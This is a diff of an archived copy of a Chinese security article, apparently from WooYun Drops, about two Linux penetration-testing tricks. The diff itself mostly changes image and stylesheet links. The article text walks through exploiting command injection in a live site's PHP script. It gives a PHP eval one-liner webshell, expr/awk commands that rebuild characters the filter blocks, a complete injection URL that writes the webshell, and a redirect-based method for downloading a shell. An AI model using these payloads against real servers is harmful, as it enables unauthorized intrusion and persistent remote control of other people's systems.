@@ -3,14 +3,14 @@
 			<head>
 			     <title>linux渗透测试技巧2则 - Xeyes</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/papers/1015">http://drops.wooyun.org/papers/1015</a></h1>
 				
       <p>
-        <h2>0x00 背景</h2>
+        </p><h2>0x00 背景</h2>
 
-<hr />
+<hr>
 
 <p>发现一网站存在漏洞，遂进行测试：</p>
 
@@ -18,15 +18,15 @@
 
 <!--more-->
 
-<p><img src="http://static.wooyun.org/201403/2014030416005735884.jpg" alt="2014030416005735884.jpg" /></p>
+<p><img src="../images_result/images/2014030416005735884.jpg" alt="2014030416005735884.jpg"></p>
 
 <p>目标环境是Red Hat6.5+Apache ，接下来的工作翻翻敏感文件,找找配置文件收集信息定位当前站点路径.</p>
 
-<p><img src="http://static.wooyun.org/201403/2014030416074032436.jpg" alt="2014030416074032436.jpg" /></p>
+<p><img src="../images_result/images/2014030416074032436.jpg" alt="2014030416074032436.jpg"></p>
 
 <h2>0x01 发现突破点</h2>
 
-<hr />
+<hr>
 
 <p>经过一段搬砖的时间查看，当前站点没有什么可以利用的,同服站点的脚本语言主要以cgi  perl  为主,少量php .一贯地毯式搜索可以利用的代码,期间找到不少有执行权限的cgi脚本,尝试在浏览器中访问,但是都提示 500内部错误,这样即使成功运行了也无法得知代码运行状态,只能放弃.又经过一段搬砖的时间,在同服站点的php文件中终于让我找到了一行有意思的php脚本代码.</p>
 
@@ -119,7 +119,7 @@ else readfile("html/".$file.".html");
 
 <p>这里的| 以及.都被替换成_(下横)出现 <code>// \\</code> 路径符号则提示Not current directory(非当前目录)</p>
 
-<p><img src="http://static.wooyun.org/201403/2014030416065776275.jpg" alt="2014030416065776275.jpg" /></p>
+<p><img src="../images_result/images/2014030416065776275.jpg" alt="2014030416065776275.jpg"></p>
 
 <pre><code>#!php
 die('make -i -f skriptit/Makefile DOT\_EXEC=bin/ SCRIPTDIR=skriptit/ PICNAME='.$file.' htmlcheck dot2png dot2png\_large dot2pdf'); 
@@ -127,7 +127,7 @@ die('make -i -f skriptit/Makefile DOT\_EXEC=bin/ SCRIPTDIR=skriptit/ PICNAME='.$
 
 <p>die 打印结果看看：</p>
 
-<p><img src="http://static.wooyun.org/201403/2014030416114563586.png" alt="2014030416114563586.png" /></p>
+<p><img src="../images_result/images/2014030416114563586.png" alt="2014030416114563586.png"></p>
 
 <p>打印结果可以得知</p>
 
@@ -141,7 +141,7 @@ die('make -i -f skriptit/Makefile DOT\_EXEC=bin/ SCRIPTDIR=skriptit/ PICNAME='.$
 
 <p>成功写入当前目录.</p>
 
-<p><img src="http://static.wooyun.org/201403/2014030416123189624.png" alt="2014030416123189624.png" /></p>
+<p><img src="../images_result/images/2014030416123189624.png" alt="2014030416123189624.png"></p>
 
 <p>当然,还可以执行命令,也同样把命令执行结果写入文件得到回显.</p>
 
@@ -150,7 +150,7 @@ die('make -i -f skriptit/Makefile DOT\_EXEC=bin/ SCRIPTDIR=skriptit/ PICNAME='.$
 
 <p>注意末尾多加了一个;(分号)截断了后面多余的东西.</p>
 
-<p><img src="http://static.wooyun.org/201403/2014030416131320282.png" alt="2014030416131320282.png" /></p>
+<p><img src="../images_result/images/2014030416131320282.png" alt="2014030416131320282.png"></p>
 
 <p>接下就是写shell，理清一下思路:</p>
 
@@ -165,7 +165,7 @@ $file = ereg_replace("\\||\\:|\\.","_",$id);
 
 <p>那么得到的文件名是 zzz_php,这里也不能用\ 来转义.</p>
 
-<p><img src="http://static.wooyun.org/201403/2014030416170030636.png" alt="2014030416170030636.png" /></p>
+<p><img src="../images_result/images/2014030416170030636.png" alt="2014030416170030636.png"></p>
 
 <p>小伙伴们可能会说,妈蛋,不是还能下载文件吗. 代码这样写</p>
 
@@ -181,7 +181,7 @@ $file = ereg_replace("\\||\\:|\\.","_",$id);
 
 <h2>0x02 绕过方式</h2>
 
-<hr />
+<hr>
 
 <p>到这得考虑如何绕过过滤分别使用两个方法得shell.</p>
 
@@ -203,25 +203,25 @@ echo &lt;?php eval($_REQUEST[v]);?&gt; &gt;test.php
 
 <p>如下图,打印了test.php文件中第一行的 6个字符，要做的就是把需要的字符都从文件中借过来。(示例的test.php 就是漏洞文件本身)</p>
 
-<p><img src="http://static.wooyun.org/201403/2014030416213050474.png" alt="2014030416213050474.png" /></p>
+<p><img src="../images_result/images/2014030416213050474.png" alt="2014030416213050474.png"></p>
 
 <p>接下来就是体力活了,要把一句话木马中所有被过滤的字符都依次借过来. 要注意的是,读取字符的间隔貌似不能包含空格,否则expr会判断列数错误.</p>
 
-<pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="b1c3dedec5f1f6deded6ddd4">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:/var/www# echo `expr substr $(awk NR==20 test.php) 5 1`
+<pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="b1c3dedec5f1f6deded6ddd4">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:/var/www# echo `expr substr $(awk NR==20 test.php) 5 1`
  "     
-<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="8bf9e4e4ffcbcce4e4ece7ee">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:/var/www# echo `expr substr $(awk NR==20 test.php) 1 1`
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="8bf9e4e4ffcbcce4e4ece7ee">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:/var/www# echo `expr substr $(awk NR==20 test.php) 1 1`
  $
-<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="45a7c5ed372a2a3105022a2a222920">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:/var/www# echo `expr substr $(awk NR==1 test.php) 1 1`
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="45a7c5ed372a2a3105022a2a222920">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:/var/www# echo `expr substr $(awk NR==1 test.php) 1 1`
  &lt;
-<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="fe1c7e568c91918abeb9919199929b">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:/var/www# echo `expr substr $(awk NR==1 test.php) 6 1`
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="fe1c7e568c91918abeb9919199929b">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:/var/www# echo `expr substr $(awk NR==1 test.php) 6 1`
 &gt;
-<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ec9e838398acab83838b8089">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:/var/www# expr substr $(awk NR==11 test.php) 35 1     
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ec9e838398acab83838b8089">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:/var/www# expr substr $(awk NR==11 test.php) 35 1     
 )     
-<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ff8d90908bbfb8909098939a">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:/var/www# expr substr $(awk NR==11 test.php) 33 1     
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ff8d90908bbfb8909098939a">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:/var/www# expr substr $(awk NR==11 test.php) 33 1     
 (
-<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="06e486ae7469697246416969616a63">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:/var/www# expr substr $(awk NR==20 test.php) 7 1     
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="06e486ae7469697246416969616a63">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:/var/www# expr substr $(awk NR==20 test.php) 7 1     
 ;
-<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="d634567ea4b9b9a29691b9b9b1bab3">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:/var/www# expr substr $(awk NR==17 test.php) 2 1     
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="d634567ea4b9b9a29691b9b9b1bab3">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:/var/www# expr substr $(awk NR==17 test.php) 2 1     
 ?
 </code></pre>
 
@@ -232,15 +232,15 @@ echo &lt;?php eval($_REQUEST[v]);?&gt; &gt;test.php
 
 <p>在shell 下成功执行</p>
 
-<p><img src="http://static.wooyun.org/201403/2014030416261134841.png" alt="2014030416261134841.png" /></p>
+<p><img src="../images_result/images/2014030416261134841.png" alt="2014030416261134841.png"></p>
 
 <p>到这里马上就能拿到shell了,用不了多久，我就会升职加薪，当上总经理，出任CEO，迎娶白富美，走上人生巅峰。想想还有点小激动呢，嘿嘿~~ </p>
 
-<p><img src="http://static.wooyun.org/201403/2014030416275658281.jpg" alt="2014030416275658281.jpg" /></p>
+<p><img src="../images_result/images/2014030416275658281.jpg" alt="2014030416275658281.jpg"></p>
 
 <p>我擦,这怎么玩......在测试环境上执行出现的结果,万万没想到最终还是有.(点),因为读test.php文件,还是需要带后缀. 你妹啊.....</p>
 
-<p><img src="http://static.wooyun.org/201403/2014030416233033879.png" alt="2014030416233033879.png" /></p>
+<p><img src="../images_result/images/2014030416233033879.png" alt="2014030416233033879.png"></p>
 
 <p>又回到点的问题.这次直接ls >xxx 把当前目录下的文件(目录文件带了后缀)都写入xxx，然后在从xxx 中借.(点)，替换原先的语句。</p>
 
@@ -249,7 +249,7 @@ echo &lt;?php eval($_REQUEST[v]);?&gt; &gt;test.php
 
 <p>以我本地环境为例,xxx文件的第1行第2列（2.php）的字符就是.(点)</p>
 
-<p><img src="http://static.wooyun.org/201403/2014030416293419945.png" alt="2014030416293419945.png" /></p>
+<p><img src="../images_result/images/2014030416293419945.png" alt="2014030416293419945.png"></p>
 
 <p>将原来语句中的test.php的.(点) 都替换成 </p>
 
@@ -268,7 +268,7 @@ echo &lt;?php eval($_REQUEST[v]);?&gt; &gt;test.php
 
 <p>执行出现了语法错误.</p>
 
-<p><img src="http://static.wooyun.org/201403/2014030416323382082.png" alt="2014030416323382082.png" /></p>
+<p><img src="../images_result/images/2014030416323382082.png" alt="2014030416323382082.png"></p>
 
 <p>换一个思路,原来绕了个大弯路.直接<code>cat test.php &gt; xxoo</code> 就解决了. 不过这样还是过滤成了test_php，只能先从 xxx把点借过来.</p>
 
@@ -296,11 +296,11 @@ echo &lt;?php eval($_REQUEST[v]);?&gt; &gt;test.php
 <pre><code>http://localhost/test.php?id=anything;echo `expr substr $(awk NR==1 xxoo) 1 1`?php eval`expr substr $(awk NR==11 xxoo) 33 1``expr substr $(awk NR==20 xxoo) 1 1`_REQUEST[v]`expr substr $(awk NR==11 xxoo) 35 1``expr substr $(awk NR==20 xxoo) 7 1``expr substr $(awk NR==17 xxoo) 2 1``expr substr $(awk NR==1 xxoo) 6 1` &gt;2`expr substr $(awk NR==30 xxoo) 13 1`php;
 </code></pre>
 
-<p><img src="http://static.wooyun.org/201403/2014030416381681081.png" alt="2014030416381681081.png" /></p>
+<p><img src="../images_result/images/2014030416381681081.png" alt="2014030416381681081.png"></p>
 
 <p>最终成功写入完整的php一句话木马.拿下目标webshell 权限.</p>
 
-<p><img src="http://static.wooyun.org/201403/2014030416360451579.png" alt="2014030416360451579.png" /></p>
+<p><img src="../images_result/images/2014030416360451579.png" alt="2014030416360451579.png"></p>
 
 <h3>总结步骤：</h3>
 
@@ -333,7 +333,7 @@ echo &lt;?php eval($_REQUEST[v]);?&gt; &gt;test.php
 <pre><code>http://tool.chinaz.com/ip/?IP=127.0.0.1
 </code></pre>
 
-<p><img src="http://static.wooyun.org/201403/2014030416412310827.png" alt="2014030416412310827.png" /></p>
+<p><img src="../images_result/images/2014030416412310827.png" alt="2014030416412310827.png"></p>
 
 <p>以本机为例（ubuntu +apache2:）</p>
 
@@ -349,15 +349,15 @@ Ps:貌似用301跳转也可以,不过我没有测试
 
 <p>效果如下图，下载后以目录结构的方式保存文件得到shell。</p>
 
-<p><img src="http://static.wooyun.org/201403/2014030416425192388.png" alt="2014030416425192388.png" /></p>
+<p><img src="../images_result/images/2014030416425192388.png" alt="2014030416425192388.png"></p>
 
 <h2>0x03 最后</h2>
 
-<hr />
+<hr>
 
 <p>欢迎大家指正错误或纰漏，以此文为例，希望大家分享一些linux shell下绕过字符过滤写shell的方法，</p>
 
-<p>最后感谢月哥悉心的指导。</p>      </p>
+<p>最后感谢月哥悉心的指导。</p>      <p></p>
     
 			</body>
 		</html>
